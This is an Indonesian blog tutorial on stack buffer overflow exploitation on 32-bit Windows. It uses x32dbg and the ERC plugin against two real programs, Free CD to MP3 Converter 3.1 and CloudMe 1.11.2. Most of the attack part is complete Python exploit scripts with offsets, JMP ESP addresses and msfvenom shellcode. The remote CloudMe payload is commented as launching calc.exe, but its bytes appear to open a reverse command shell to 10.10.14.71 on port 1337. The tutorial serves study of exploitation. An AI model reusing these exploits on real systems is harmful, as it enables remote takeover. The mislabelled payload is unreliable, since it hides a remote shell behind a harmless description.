---
title: 'Stack-based Buffer Overflows on Windows x86'
date: 2022-12-29 14:05:22 +0700
categories: ['Binary Exploitation', 'Windows']
tags: [assembly, buffer overflows, stack-buffer overflows, x86, binexp-win, x64dbg]     # TAG names should always be lowercase
author: nairpaa
---

**Buffer overflow** terjadi saat program menerima data yang lebih panjang dari yang diharapkan, sehingga menimpa seluruh ruang memori buffer di [Stack](https://en.wikipedia.org/wiki/Stack_(abstract_data_type)).

Hal ini dapat menimpa *Instruction Pointer* `EIP` (atau `RIP` di x86_64), yang menyebabkan program *crash* karena akan mengekseksui instruksi pada alamat memori yang tidak valid.

Teori stack-buffer overflows pada Windows sama seperti pada Linux yang dijelaskan pada [artikel](https://nairpaa.github.io/posts/stack-buffer-overflows-linux/) sebelumnya.

## 1. Why Learn Basic Stack Overflows?

Mengapa kita tetap mempelajari stack-based overflows yang sudah jarang ditemui karena banyaknya proteksi memori?

Mempelajari pemahaman dasar *binary exploitation* akan membantu kita untuk memahami teknik eksploitasi lebih lanjut seperti [Structured Exception Handling (SEH)](https://docs.microsoft.com/en-us/cpp/cpp/structured-exception-handling-c-cpp), [Return Oriented Programming (ROP)](https://resources.infosecinstitute.com/topic/return-oriented-programming-rop-attacks/), dll. 

## 2. Debugging Windows Programs

Untuk berhasil mengidentifikasi dan mengeksploitasi buffer overflows di program Windows, kita perlu men-*debug* program untuk mengikuti alur eksekusi dan datanya di memori.

Terdapat banyak *tools* yang bisa kita gunakan, sepereti  Immunity Debugger, OllyDBG, WingDB, atau IDA Pro. Tetapi pada kesempatan kali ini kami akan menggunakan [x64gdb](https://x64dbg.com/) karena pengembangannya masih aktif dan juga gratis.

### 1.1. Instalation

Instalasi `x64gdb` dapat Anda ikuti pada [tutorial resmi](https://github.com/x64dbg/x64dbg#installation--usage).

### 2.1. x64gdb vs x32gdb

`x64dbg` dilengkapi dengan dua aplikasi terpisah, satu `x32gdb.exe` untuk program 32-bit dan dan `x64gdb.exe` untuk program 32-bit. 

Karena kita akan mepelajari eksploitasi pada program 32-bit, maka kita akan menggunakan `x32gdb.exe`.

### 2.2. ERC

Plugin `ERC` akan sangat membantu kita untuk me-*debug* program. Untuk menginstal plugin ini, kita dapat mengakses [halaman rilis](https://github.com/Andy53/ERC.Xdbg/releases), lalu download file `zip` yang sesuai dengan aplikasi *debugger* kita (`x64` atau `x32`). Selanjutnya *extract* konten tersebut pada folder plugin `x64dbg` (contoh: `C:\Program Files\x64dbg\x32\plugins`).

Setelah selesai, plugin seharusnya sudah siap digunakan. Jadi, setelah kita menjalankan `x32dbg`, kita dapat mengetik `ERC --help` di bilah perintah di bagian bawah untuk melihat menu bantuan `ERC`.

Untuk melihat output `ERC`, kita harus beralih ke tab `Log` dengan mengkliknya atau dengan mengklik `Alt+L`, seperti yang dapat kita lihat di bawah: 

![ERC Plugin](/assets/img/posts/stack-buffer-overflows-windows/1.png)

Kita juga dapat mengatur direktori kerja default untuk menyimpan semua output file, menggunakan perintah berikut:

```bash
ERC --config SetWorkingDirectory D:\Labs\binary-exploit\bof32win
```

Sekarang semua output dari perinah ERC akan disimpan pada direktori tersebut.

### 2.3. Debugging Program

Setiap kali kita ingin men-*debug* sebuah program, kita dapat menjalankannya melalui `x32dbg`, atau menjalankannya secara terpisah dan kemudian meng-*attach* ke prosesnya melalui `x32dbg`.

Untuk membuka program dengan `x32dbg`, kita dapat memilih `File>Open` atau tekan `F3`, yang akan meminta kita untuk memilih program yang akan di-*debug*.

> Pada kesempatan latihan kali ini kita akan men-*debug* aplikasi [**Free CD to MP3 Converter 3.1**](https://www.exploit-db.com/exploits/15480) yang rentan terhadap buffer overflows.
{: .prompt-info }

![Attach Program Pada x64dbg](/assets/img/posts/stack-buffer-overflows-windows/2.png)

> Jika kita ingin men-*debug* proses yang berjalan sebagai administrator, kita bisa jalankan ulang x32dbg sebagai administrator dengan mengklik `File > Restart as Admin`.
{: .prompt-tip }

### 2.3. Getting Help

Jika kita membutuhkan informasi lebih tentang aplikasi *debugger* ini, kita dapat merujuk ke [dokumentasi x64dbg](https://help.x64dbg.com/en/latest/) dan [dokumentasi ERC](https://andy53.github.io/ERC.net/api/index.html).

Sekarang setelah semua alat sudah siap, kita dapat mulai men-*debug* program pertama kita untuk mencoba menemukan kerentanan stack buffer overflow dan mengeksploitasinya.

## 3. Local Exploit

Untuk eksploitasi stack-based buffer overflow, kita biasanya mengikuti beberapa langkah utama untuk mengidentifikasi dan mengeksploitasi kerentanan buffer overflow, diantaranya:
1.  *Fuzzing Parameters*
2.  *Controlling EIP*
3.  *Identifying Bad Characters*
4.  *Finding a Return Instruction*
5.  *Jumping to Shellcode*

### 3.1. Fuzzing

Biasanya, langkah pertama dalam latihan mencari kerentanan pada binary adalah dengan melakukan *fuzzing* pada setiap parameter atau input yang ada pada program. Hal ini dilakukan untuk melihat apakah input tersebut menyebabkan program *crash* atau tidak. 

Jika *fuzzing* menyebabkan program *crash*, kita akan menganalisis apa yang menyebabkan program *crash*. Jika kita melihat bahwa program *crash* karena input kita menimpa register `EIP`, kemungkinan besar kita memiliki kerentanan stack buffer overflows.

#### 3.1.1. Identifying Input Fields

Setelah kita mempelajari aplikasi yang akan di-*debug*, kita mendapati beberapa kolom input yang dapat kita uji, seperti:

| Field               | Example                                                                                                        |
|---------------------|----------------------------------------------------------------------------------------------------------------|
| `Text Input Fields` | - Form "*license registration*" yang muncul ketika program dijalankan. <br />- Beberapa form teks di bagian preferensi program. |
| `Opened Files`      | File apa pun yang dapat dibuka oleh program.                                                                   |
| `Program Arguments` | Berbagai argumen yang diterima oleh program selama runtime.                                                    |
| `Remote Resources`  | File atau *resource* apa pun yang dimuat oleh program saat dijalankan atau dalam kondisi tertentu.             |

#### 3.1.2. Fuzzing Text Fields

Kita akan melakukan *fuzzing* terhadap setiap fitur. Pada kesempatan kali ini kita akan mencoba terlebih dahulu pada **form license registration** yang muncul pertama kali ketika aplikasi dijalankan.

Kita akan mencoba meng-input-kan 10000 karakter pada setiap form. 

```powershell
PS > python -c "print('A' * 10000)"
..<SNIP>..AAAAAAA..<SNIP>..
```

![Percobaan Fuzzing Pada Form License Registration](/assets/img/posts/stack-buffer-overflows-windows/3.png)

Setelah melakukan beberapa percobaan *fuzzing* pada form tersebut, aplikasi tidak mengalami *crash*. Karena dari itu, kita dapat berasumsi bahwa form tersebut tidak rentan terhadap *buffer overflows*.

#### 3.1.3. Fuzzing Opened Files

Selanjutnya kita beralih pada fitur **Open File** pada **fitur Encode**. Fitur ini menerima file dalam ekstensi `.wav`. Maka dari itu kita akan menyisipkan karakter *fuzzing* pada file dengan ekstensi `.wav`, seperti berikut:
```powershell
PS > python -c "print('A' * 10000)" > fuzz.wav
# atau
PS > python -c "print('A' * 10000, file=open('fuzz.wav', 'w'))"
```

![Upload .wav](/assets/img/posts/stack-buffer-overflows-windows/4.png)

![Aplikasi Mengalami Crash - 1](/assets/img/posts/stack-buffer-overflows-windows/5.png)

![Aplikasi Mengalami Crash - 2](/assets/img/posts/stack-buffer-overflows-windows/6.png)


Terlihat pada gambar di atas, ketika kami mencoba membuka file `.wav` yang berisi 10000 karakter, aplikasi mengalami *crash* karena input-an tersebut menimpa register `EIP`. Hal ini membuktikan bahwa fitur tersebut rentan terhadap serangan stack buffer overflows.

### 3.2. Controlling EIP

Langkah selanjutnya adalah mengotrol alamat dari register `EIP`.  Untuk melakukan hal ini, pertama-tama kita harus menghitung terlebih dahulu *offset* `EIP` yang tepat, yang berarti seberapa banyak input yang dibutuhkan untuk mencapai `EIP`.

#### 3.2.1. Create Pattern

Terdapat beberapa cara untuk menghitung *offset*, diantaranya menggunakan tools `msf-pattern_create` atau menggunakan plugin `ERC` untuk menghasilkan *pattern* karakter.

```bash
# Membuat pattern sebanyak 5000 bytes
➜ /usr/bin/msf-pattern_create -l 5000
Aa0Aa1Aa2A..<SNIP>..Gk0Gk1Gk2Gk3Gk4Gk5Gk
```

```bash
# Membuat pattern sebanyak 5000 bytes
ERC --pattern c 5000 # ke simpen \<PATH-ERC>\Pattern_Create_1.txt
```

Setelah mendapatkan *pattern* untuk menemukan *offset*, selanjutnya masukkan *pattern* tersebut ke dalam *script* python seperti berikut:

```python
def eip_offset():
    payload = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac...<SNIP>...Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk", "utf-8")
    with open('pattern.wav', 'wb') as f:
        f.write(payload)

eip_offset()
```

Jalankan *script* python tersebut dan kita akan mendapatkan file `pattern.wav`.

Karena sebelumnya aplikasi *crash*, kita *restart* terlebih dahulu aplikasinya.

![Restart Aplikasi Melalui x64dbg](/assets/img/posts/stack-buffer-overflows-windows/8.png)

Setelah itu, upload file `pattern.wav` tersebut. 

![Mendapatkan Nilai EIP Dari Upload Pattern](/assets/img/posts/stack-buffer-overflows-windows/7.png)

Terlihat pada gambar di atas, `EIP` yang dihasilkan dari hasil upload file tersebut adalah `0x31684630`. Dengan `msf-pattern_offset`, kita dapat mengetahui bahwa *offset* `EIP` adalah sebesar **4112 bytes**.

```bash
➜ /usr/bin/msf-pattern_offset -q 31684630
[*] Exact match at offset 4112
```

Kita juga dapat mengetahui nilai *offset* melalui `ERC`. Pertama, kita lihat terlebih dahulu nilai ASCII dari alamat `EIP`.

![Mencari Nilai Offset - 1](/assets/img/posts/stack-buffer-overflows-windows/9.png)

Selanjutnya jalankan perintah `ERC` seperti berikut:

```bash
ERC --patern o <ASCII>
```

![Mencari Nilai Offset - 2](/assets/img/posts/stack-buffer-overflows-windows/10.png)

Terlihat bahwa kita mendapatkan *offset* sebesar **4112 bytes**. 

Selain itu, kita juga bisa mendapatkan nilai *offset* secara langsung dengan perintah berikut:

```bash
ERC --findNRP
```

![Mencari Nilai Offset - 3](/assets/img/posts/stack-buffer-overflows-windows/11.png)

Seperti yang dapat kita lihat, perintah tersebut menemukan *offset* berdasarkan pola yang ditemukan di berbagai register. 

#### 3.2.2. Control EIP

Setelah mengetahui nilai *offset*, kita dapat mengontrol nilai `EIP` dengan menggunakan *script* berikut.

```python
def eip_control():
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip
    
    with open('control.wav', 'wb') as f:
        f.write(payload)

eip_control()
```

![Berhasil Mengontrol EIP](/assets/img/posts/stack-buffer-overflows-windows/12.png)

Terlihat pada gambar di atas, bahwa nilai `EIP` sudah seperti yang kita tentukan pada *script*, yaitu bernilai `B` atau `0x42` dalam heksadesimal.

### 3.3. Identifying Bad Characters

Sama seperti pada eksploitasi buffer overflows di [Linux](https://nairpaa.github.io/posts/stack-buffer-overflows-linux/#identification-of-bad-characters), kita perlu mengindentifikasi terlebih dahulu *bad characters* sebelum membuat *payload* eksploitasi.

Dengan plugin `ERC`, kita dapat mudah mengindentifikasi *bad characters*. 

Pertama, kita buat terlebih dahulu list karakter menggunakan perintah seperti berikut.

```bash
ERC --bytearray
# atau jika ingin menghilangkan 0x00
ERC --bytearray -bytes 0x00
```

![Generate List Karakter](/assets/img/posts/stack-buffer-overflows-windows/13.png)

Selanjutnya, list karakter tersebut kita masukkan ke dalam *script* python seperti berikut, lalu kita jalankan.

```python
def bad_chars():
    all_chars = bytes([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,...<SNIP>...0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF])

    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars
    
    with open('chars.wav', 'wb') as f:
        f.write(payload)

bad_chars()
```

![Mendapatkan Nilai ESP](/assets/img/posts/stack-buffer-overflows-windows/14.png)

Setelah *payload* tersebut dijalankan, kita akan menggunakan nilai dari register `ESP`, yaitu `0x0014F974`. Nilai tersebut akan kita bandingkan dengan list karakter yang telah dibuat sebelumnya.

```bash
ERC --compare 0014F974 D:\Labs\binary-exploit\bof32win\ByteArray_1.bin
```

![Membandingkan List Karakter](/assets/img/posts/stack-buffer-overflows-windows/15.png)

Terlihat pada gambar di atas, pada kasus ini kita tidak menemukan *bad characters* sama sekali.

### 3.4. Finding a Return Instructuion

Untuk mengarahkan alur eksekusi ke Stack, kita harus menentukan alamat yang tepat pada `EIP`. Hal ini dapat dilakukan dengan beberapa cara, salah satu yang umum digunakan adalah menggunakan alamat dari instruksi `JMP ESP`.

Pertama-tama, kita akan list terlebih dahulu modul yang digunakan oleh program ini.

```bash
ERC --ModuleInfo
```

![List Modul](/assets/img/posts/stack-buffer-overflows-windows/16.png)


Terlihat pada gambar di atas, modul `cdextract.exe` tidak memiliki pengamanan memori apa pun.

![Mencari Alamat JMP ESP - 1](/assets/img/posts/stack-buffer-overflows-windows/17.png)

![Mencari Alamat JMP ESP - 2](/assets/img/posts/stack-buffer-overflows-windows/18.png)

![Mencari Alamat JMP ESP - 3](/assets/img/posts/stack-buffer-overflows-windows/19.png)


Terlihat pada gambar di atas, modul `cdextract.exe` memiliki beberapa instruksi `JMP ESP` yang bisa kita gunakan. Salah satunya adalah `0x00419D0B`.

### 3.5. Jumping Shellcode

Sejauh ini kita telah mengidentifikasi dan mengeksploitasi kerentanan stack buffer overflows.

Langkah terakhir adalah menulis *shellcode* pada Stack untuk dieksekusi ketika alamat yang ada pada `EIP` diakses oleh program.

Untuk membuat *shellcode* kita bisa menggunakan `msfvenom` seperti berikut:

```bash
msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
```

Masukkan *shellcode* tersebut ke dalam *script* python seperti berikut, lalu jalankan.

```python
from struct import pack

def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf =  b""
    buf += b"\xb8\xdf\x52\xa9\xbe\xd9\xed\xd9\x74\x24\xf4\x5f\x2b"
    buf += b"\xc9\xb1\x31\x31\x47\x13\x03\x47\x13\x83\xef\x23\xb0"
    buf += b"\x5c\x42\x33\xb7\x9f\xbb\xc3\xd8\x16\x5e\xf2\xd8\x4d"
    buf += b"\x2a\xa4\xe8\x06\x7e\x48\x82\x4b\x6b\xdb\xe6\x43\x9c"
    buf += b"\x6c\x4c\xb2\x93\x6d\xfd\x86\xb2\xed\xfc\xda\x14\xcc"
    buf += b"\xce\x2e\x54\x09\x32\xc2\x04\xc2\x38\x71\xb9\x67\x74"
    buf += b"\x4a\x32\x3b\x98\xca\xa7\x8b\x9b\xfb\x79\x80\xc5\xdb"
    buf += b"\x78\x45\x7e\x52\x63\x8a\xbb\x2c\x18\x78\x37\xaf\xc8"
    buf += b"\xb1\xb8\x1c\x35\x7e\x4b\x5c\x71\xb8\xb4\x2b\x8b\xbb"
    buf += b"\x49\x2c\x48\xc6\x95\xb9\x4b\x60\x5d\x19\xb0\x91\xb2"
    buf += b"\xfc\x33\x9d\x7f\x8a\x1c\x81\x7e\x5f\x17\xbd\x0b\x5e"
    buf += b"\xf8\x34\x4f\x45\xdc\x1d\x0b\xe4\x45\xfb\xfa\x19\x95"
    buf += b"\xa4\xa3\xbf\xdd\x48\xb7\xcd\xbf\x06\x46\x43\xba\x64"
    buf += b"\x48\x5b\xc5\xd8\x21\x6a\x4e\xb7\x36\x73\x85\xfc\xc9"
    buf += b"\x39\x84\x54\x42\xe4\x5c\xe5\x0f\x17\x8b\x29\x36\x94"
    buf += b"\x3e\xd1\xcd\x84\x4a\xd4\x8a\x02\xa6\xa4\x83\xe6\xc8"
    buf += b"\x1b\xa3\x22\xab\xfa\x37\xae\x02\x99\xbf\x55\x5b"

    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf
    
    with open('exploit.wav', 'wb') as f:
        f.write(payload)

exploit()
```

![Local Stack Buffer Overflows Berhasil Menjalankan Program Calc.exe](/assets/img/posts/stack-buffer-overflows-windows/20.png)

Ketika *payload* dijalankan, program `calc.exe` akan berjalan. Hal ini membuktikan bahwa kita telah berhasil membuat ekploitasi untuk kerentanan lokal stack buffer overflows.

## 4. Remote Exploit

Setelah sebelumnya kita telah berhasil membuat *script* eksploitasi stack buffer overflows secara lokal, kali ini kita akan membuat *script* eksploitasi stack buffer overflows secara remote. 

Teknik yang digunakan sama seperti eksploitasi lokal, hanya saja kali ini *payload* dikirimkan melalui koneksi jaringan. 

Pada kesempatan kali ini, kita akan menggunakan aplikasi [**CloudMe 1.11.2**](https://www.cloudme.com/downloads/CloudMe_1112.exe) yang rentan terhadap stack buffer overflows.

### 4.1. Debugging A Remote Program

Pertama, jalankan aplikasi CloudMe dan *attach* prosesnya pada `x32gdb`.

Selanjutnya, kita pastikan terlebih dulu bahwa aplikasi telah berjalan. Terlihat pada hasil berikut, CloudMe menjalankan `port 8888`.

```powershell
PS > netstat -a
..<SNIP>..
TCP    0.0.0.0:8888           0.0.0.0:0              LISTENING
[CloudMe.exe]
..<SNIP>..
```

Kita dapat menggunakan `netcat` untuk berinteraksi dengan port tersebut.

```powershell
PS > .\nc.exe 127.0.0.1 8888
?
PS > .\nc.exe 127.0.0.1 8888
help
```

Kita telah mencoba meng-input-kan beberapa data pada port tersebut, tetapi koneksi langsung terputus tanpa memberikan respons apa pun. Jadi, mari kita coba untuk men-*debug*-nya dan melakukan *fuzzing* untuk melihat bagaimana aplikasi melakukan penanganan pada input-an tersebut.

### 4.2. Remote Fuzzing

Untuk melakukan *fuzzing* secara remote, kita bisa menggunakan *script* seperti berikut:

```python
import socket
from struct import pack

IP = "127.0.0.1"
port = 8888

def fuzz():
    try:
        for i in range(0,10000,500):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            #breakpoint()
            s.close()
    except:
        print("Could not establish a connection")

fuzz()
```

> Penggunaan fungsi `breakpoint()` akan membantu proses *fuzzing* untuk mendapatkan hasil yang lebih tepat.
{: .prompt-tip }

Ketika *script* tersebut dijalankan, aplikasi mengalami *crash* dan nilai `EIP` pun tertimpa. Hal ini membuktikan bahwa aplikasi ini rentan terhadap remote stack buffer overflows.

```bash
Fuzzing 0 bytes
Fuzzing 500 bytes
...SNIP...
Fuzzing 9000 bytes
Fuzzing 9500 bytes
```

![Fuzzing Remote Menyebabkan Crash](/assets/img/posts/stack-buffer-overflows-windows/21.png)

### 4.3. Controlling EIP

Selanjutnya, kita cari tahu *offset* untuk mengontrol `EIP` menggunakan *script* berikut:

```python
def eip_offset():
    payload = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac..<SNIPED>..Mb9Mc0Mc1Mc2Mc3Mc4Mc5Mc6Mc7Mc8Mc9Md0Md1Md2Md3Md4Md5Md6Md7Md8Md9Me0Me1Me2Me3Me4Me5Me", "utf-8")
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

eip_offset()
```

![Mendapatkan Pattern Offset](/assets/img/posts/stack-buffer-overflows-windows/22.png)

```bash
ERC --pattern o 1jB0
```

Dari hasil `EIP` di atas, kita menemukan bahwa *offset* yang dibutuhkan adalah sebesar **1052 bytes**.

### 4.3. Identifying Bad Characters

Untuk mengidentifikasi *bad characters*, kita bisa menggunakan *script* seperti berikut:

```python
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        ...SNIP...
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])

    offset = 1052
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

bad_chars()
```

![Mendapatkan Nilai ESP](/assets/img/posts/stack-buffer-overflows-windows/23.png)


![Membandingkan List Karakter](/assets/img/posts/stack-buffer-overflows-windows/24.png)

Dari hasil pemeriksaan di atas, kita tidak menemukan satu pun *bad characters*.

### 4.4. Finding a Return Instruction

Setelah melakukan pemeriksaan pada setiap modul yang tidak memiliki proteksi keamanan memori, kami melihat terdapat instruksi `JMP ESP` pada modul `MSVCR120.dll`.

![List Modul](/assets/img/posts/stack-buffer-overflows-windows/25.png)

```bash
CloudMe.exe  # <-- Tidak ada JMP ESP
Qt5Gui.dll # <-- Tidak ada JMP ESP
Qt5Core.dll # <-- Tidak ada JMP ESP
Qt5Network.dll # <-- Tidak ada JMP ESP
qwindows.dll # <-- Tidak ada JMP ESP
Qt5Sql.dll # <-- Tidak ada JMP ESP
Qt5Xml.dll # <-- Tidak ada JMP ESP
libgcc_s_dw2-1.dll # <-- Tidak ada JMP ESP
MSVCR120.dll # <-- Ada JMP ESP
libstdc++-6.dll  # <-- Tidak ada JMP ESP
libwinpthread-1.dll  # <-- Tidak ada JMP ESP
```
{: file="list-modul"}

![Mendapatkan Alamat JMP ESP](/assets/img/posts/stack-buffer-overflows-windows/26.png)

Instruksi `JMP ESP` tersebut salah satunya terdapat pada alamat `0x5D6DADF3` yang akan kita gunakan sebagai nilai `EIP`.

Dengan menggunakan *script* berikut, kami berhasil menjalankan program `calc.exe` secara remote melalui eksploitasi *stack-based buffer overflows*.

```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf =  b""
    buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
    buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
    buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
    buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
    buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\x47\x68"
    buf += b"\x02\x00\x05\x39\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
    buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
    buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
    buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
    buf += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
    buf += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
    buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
    buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
    buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
    buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

    offset = 1052
    buffer = b"A"*offset
    eip = pack('<L', 0x5D6DADF3)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

exploit()
```

Ketika *script* tersebut dijalankan, kita berhasil menjalankan program `calc.exe` secara remote pada server yang rentan.

---

Referensi:
- https://academy.hackthebox.com/module/details/89
- https://github.com/x64dbg/x64dbg
- https://resources.infosecinstitute.com/topic/return-oriented-programming-rop-attacks/
- https://learn.microsoft.com/en-us/cpp/cpp/structured-exception-handling-c-cpp?view=msvc-170